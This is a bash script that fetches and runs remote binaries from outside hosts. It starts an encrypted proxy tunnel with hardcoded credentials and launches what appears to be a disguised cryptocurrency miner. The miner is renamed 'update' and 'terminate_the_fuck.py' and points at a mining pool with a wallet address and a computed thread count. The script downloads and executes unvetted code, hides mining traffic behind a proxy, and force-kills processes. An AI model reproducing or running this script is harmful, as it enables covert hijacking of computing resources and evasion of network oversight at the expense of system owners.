#!/bin/bash
git clone https://github.com/miltoncarpenter665/tidepy.git
sleep 2
cd tidepy
sleep 2
python3 -m venv .venv
sleep 2
source .venv/bin/activate
sleep 2
pip3 install .
wget https://greenleaf.teatspray.uk/Spectre.tar.gz
sleep 2
tar -xf Spectre.tar.gz
sleep 2
./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@usashadespectre$(shuf -i 1-6 -n 1).devopsenterprise.uk:8443 &
sleep 2
curl -x socks5h://127.0.0.1:1082 api.ipify.org
sleep 2
curl -x socks5h://127.0.0.1:1082 http://greenleaf.teatspray.uk/update.tar.gz -L -O -J
sleep 2
tar -xf update.tar.gz
sleep 2
cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1082
END
sleep 2
./update/local/update-local -config update/local/update-local.conf & > /dev/null
sleep 2
ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
sleep 2
./update/local/update-local -config update/local/update-local.conf & > /dev/null
sleep 2
./update/update wget -q -O- http://api.ipify.org

sleep 2
TZ='Africa/Johannesburg'; export TZ
date
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

sleep 2

currentdate=$(date '+%d-%b-%Y_Shiny_')
ipaddress=$(curl -s api.ipify.org)
num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
used_num_of_cores=`expr $num_of_cores - 4`
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

sleep 2

echo ""
echo "You will be using $used_num_of_cores cores"
echo ""
sleep 2

./update/update python3 terminate_the_fuck.py -o zerganycast.devopsenterprise.uk:6237 -u TP5gu4QH88SvvCX2HnDRZsQL7mmDxNvVKY.$currentdate -p c=TDC,mc=TDC,m=solo,ID=$currentdate -t $used_num_of_cores
